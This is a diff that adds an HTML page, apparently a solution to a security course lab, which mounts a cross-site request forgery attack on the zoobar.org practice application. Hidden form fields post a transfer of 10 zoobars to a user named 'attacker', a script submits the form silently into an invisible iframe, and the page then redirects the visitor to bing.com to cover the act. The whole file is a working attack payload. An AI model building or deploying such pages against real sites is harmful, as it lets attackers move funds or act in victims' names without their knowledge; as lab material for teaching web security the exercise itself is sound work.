@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+   <body>
+	<form method=POST id="transferForm" name=transferformb action="http://zoobar.org/transfer.php">
+		<input name=zoobars type=text value="10" size=5 style="visibility:hidden">
+		<input name=recipient type=text value="attacker" style="visibility:hidden">
+		<input type=submit name=submission value="Send" id="submitButton" style="visibility:hidden">
+	</form>	
+   </body> 
+   <iframe name="transferFrame" style="visibility:hidden"></iframe>
+
+   <script>
+	document.getElementById("transferForm").target = transferFrame.name;
+   	document.getElementById("submitButton").click();
+   	setTimeout(function() {
+		window.location.replace("http://www.bing.com");
+   	}, 500);
+   </script>
+</html>
